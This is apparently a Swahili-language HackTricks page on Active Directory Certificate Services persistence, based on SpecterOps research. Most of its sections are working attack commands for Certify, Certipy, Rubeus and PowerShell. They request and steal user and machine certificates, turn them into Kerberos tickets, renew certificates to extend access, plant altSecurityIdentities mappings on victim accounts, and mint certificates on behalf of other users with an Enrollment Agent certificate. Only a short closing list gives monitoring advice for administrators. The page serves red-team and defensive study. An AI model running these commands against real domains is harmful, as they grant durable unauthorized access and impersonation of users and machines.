# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Hii ni muhtasari mfupi wa sura za uendelevu wa akaunti za utafiti mzuri kutoka [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Kuelewa Uiba wa Vidhinisho vya Mtumiaji Aliye Hai kwa Vitendo – PERSIST1

Katika hali ambapo cheti kinachoruhusu uthibitisho wa domain kinaweza kuombwa na mtumiaji, mshambuliaji ana fursa ya kuomba na kuiba cheti hicho ili kudumisha uendelevu kwenye mtandao. Kwa chaguo-msingi, kiolezo cha `User` katika Active Directory kinaruhusu maombi kama hayo, ingawa wakati mwingine kinaweza kuwa kimezimwa.

Kutumia [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy), unaweza kutafuta violezo vilivyowashwa vinavyoruhusu client authentication kisha kuomba mmoja:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Nguvu ya cheti iko katika uwezo wake wa kuthibitisha kama mtumiaji anayemiliki, bila kuzingatia mabadiliko ya nenosiri, mradi tu cheti hicho bado kiko halali.

Unaweza kubadilisha PEM kuwa PFX na kulitumia kupata TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Kumbuka: Ikitumika pamoja na mbinu nyingine (angalia sehemu za THEFT), uthibitishaji unaotegemea vyeti unaruhusu upatikanaji wa kudumu bila kugusa LSASS na hata kutoka kwa muktadha usio na ruhusa za juu.

## Kupata Persistence ya Mashine kwa kutumia Vyeti - PERSIST2

Ikiwa mdukuzi ana ruhusa za juu kwenye mashine mwenyeji, wanaweza kusajili akaunti ya mashine ya mfumo uliovamiwa kwa cheti kwa kutumia kiolezo cha chaguo-msingi `Machine`. Kujitambulisha kama mashine kunawawezesha S4U2Self kwa huduma za ndani na kunaweza kutoa udumifu wa kudumu wa mashine mwenyeji:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Kupanua Uendelevu Kupitia Upya wa Cheti - PERSIST3

Kutumia vibaya vipindi vya uhalali na vya upyaji vya violezo vya cheti kunamwezesha mshambuliaji kudumisha ufikiaji wa muda mrefu. Ikiwa unamiliki cheti kilichotolewa hapo awali na ufunguo wake wa kibinafsi, unaweza kukiaktisha upya kabla ya kumalizika ili kupata cheti kipya chenye uhai mrefu bila kuacha nyaraka za ziada za maombi zilizohusishwa na mhusika wa awali.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Tipu ya kiutendaji: Fuatilia muda wa uhai wa faili za PFX zinazoshikiliwa na mshambuliaji na upya mapema. Upya pia inaweza kusababisha certificates zilizosasishwa kujumuisha upanuzi wa ulinganifu wa SID wa kisasa, na kuwafanya waendelee kutumika chini ya sheria kali za ulinganifu za DC (tazama sehemu inayofuata).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Ikiwa unaweza kuandika kwenye sifa ya akaunti lengwa `altSecurityIdentities`, unaweza kutoza wazi cheti kinachodhibitiwa na mshambuliaji kwa akaunti hiyo. Hii inaendelea hata baada ya mabadiliko ya nenosiri na, ukitumia miundo imara ya ulinganifu, inabaki kufanya kazi chini ya utekelezaji wa kisasa wa DC.

Mtiririko wa kiwango cha juu:

1. Pata au toa client-auth certificate unayodhibiti (mfano, jisajili kwa template ya `User` kama wewe mwenyewe).
2. Toa kitambulisho imara kutoka kwenye cert (Issuer+Serial, SKI, au SHA1-PublicKey).
3. Ongeza ramani wazi kwenye `altSecurityIdentities` ya principal wa mwathiriwa ukitumia kitambulisho hicho.
4. Thibitisha kwa kutumia certificate yako; DC itaielekeza kwa mwathiriwa kupitia ramani wazi.

Mfano (PowerShell) ukitumia ramani imara ya Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Kisha thibitisha kwa PFX yako. Certipy itapata TGT moja kwa moja:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Kujenga Ramani Imara za `altSecurityIdentities`

Kivitendo, ramani za **Issuer+Serial** na **SKI** ndizo miundo imara rahisi kujenga kutoka kwa cheti kilichoshikiliwa na mshambuliaji. Hii itakuwa muhimu baada ya **February 11, 2025**, wakati DCs zitakapoweka **Full Enforcement** kama chaguo-msingi na ramani dhaifu zitakapokwisha kuwa za kuaminika.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Vidokezo
- Tumia aina za mapping zilizo imara tu: `X509IssuerSerialNumber`, `X509SKI`, au `X509SHA1PublicKey`. Miundo dhaifu (Subject/Issuer, Subject-only, RFC822 email) imepitwa na wakati na inaweza kuzuizwa na sera ya DC.
- Mapping inafanya kazi kwa vitu vya **user** na **computer**, hivyo ufikiaji wa kuandika kwenye akaunti ya kompyuta kwenye `altSecurityIdentities` unatosha kuweka uendelevu kama mashine hiyo.
- Mnyororo wa vyeti lazima ujengwe hadi root inayotambulika na DC. Enterprise CAs ndani ya NTAuth kwa kawaida zinatambulika; baadhi ya mazingira pia huamini public CAs.
- Schannel authentication inaendelea kuwa muhimu kwa uendelevu hata wakati PKINIT inashindwa kwa sababu DC hauna Smart Card Logon EKU au inarejesha `KDC_ERR_PADATA_TYPE_NOSUPP`.

Kwa habari zaidi kuhusu mappings dhaifu za wazi na njia za shambulio, tazama:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Ikiwa utapata Certificate Request Agent/Enrollment Agent certificate halali, unaweza kutengeneza vyeti vipya vinavyoweza kutumika kuingia kwa niaba ya watumiaji kwa wakati wowote na kuhifadhi PFX ya wakala nje ya mtandao kama tokeni ya uendelevu. Mtiririko wa matumizi mabaya:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Kurevoke kwa agent certificate au ruhusa za template kunahitajika ili kuondoa persistence hii.

Operational notes
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, hivyo mshambuliaji mwenye Enrollment Agent PFX anaweza kutengeneza na baadaye ku-renew leaf certificates bila kugusa tena akaunti ya lengo la asili.
- Ikiwa upokeaji wa TGT kwa njia ya PKINIT hauwezekani, cheti kinachotokana na on-behalf-of bado kinaweza kutumika kwa authentication ya Schannel kwa `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 ilianzisha Strong Certificate Mapping Enforcement kwenye domain controllers. Tangu Februari 11, 2025, DCs zimetegemezwa kuwa katika Full Enforcement, zikikataa mappings dhaifu/zinazoonekana kuwa hazieleweki. Mambo ya vitendo:

- Vyeti za kabla ya 2022 ambazo hazina extension ya SID mapping zinaweza kushindwa kwenye implicit mapping wakati DCs ziko katika Full Enforcement. Washambuliaji wanaweza kudumisha ufikiaji kwa ku-renew vyeti kupitia AD CS (kupata extension ya SID) au kwa kuweka mapping kali ya wazi katika `altSecurityIdentities` (PERSIST4).
- Mappings za wazi zinazotumia formats kali (Issuer+Serial, SKI, SHA1-PublicKey) zinaendelea kufanya kazi. Formats dhaifu (Issuer/Subject, Subject-only, RFC822) zinaweza kuzuiwa na zinapaswa kuepukwa kwa persistence.

Wasimamizi wanapaswa kufuatilia na kutoa tahadhari kuhusu:
- Mabadiliko ya `altSecurityIdentities` na utoaji/ku-renew kwa Enrollment Agent na User certificates.
- CA issuance logs kwa maombi ya on-behalf-of na mifumo isiyo ya kawaida ya renewal.

## References

- Microsoft. KB5014754: Mabadiliko ya certificate-based authentication kwenye Windows domain controllers (ratiba ya enforcement na mappings zenye nguvu).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
